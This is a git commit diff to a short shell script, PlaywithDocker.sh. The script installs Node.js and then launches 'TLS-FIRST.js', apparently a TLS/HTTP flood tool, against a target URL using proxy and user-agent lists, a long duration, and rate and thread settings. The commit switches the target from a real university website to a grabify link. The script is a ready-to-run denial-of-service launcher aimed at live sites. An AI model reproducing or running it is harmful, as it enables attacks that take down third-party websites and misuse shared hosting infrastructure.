f589e3620f0d4693ff78a97ab98e29afff4c11f8
hellovokzal <100135590+hellovokzal@users.noreply.github.com>
2023-06-30 15:59:17 +0500

    Update PlaywithDocker.sh

--- PlaywithDocker.sh
+++ PlaywithDocker.sh
@@ -6,5 +6,5 @@ bash install.sh -y
 apk add nodejs
 apk add npm
 npm i colors
-node TLS-FIRST.js https://www.harvard.edu/ 3000 proxy.txt ua.txt 10 100
+node TLS-FIRST.js https://grabify.link/JELHDN 3000 proxy.txt ua.txt 5 64
 
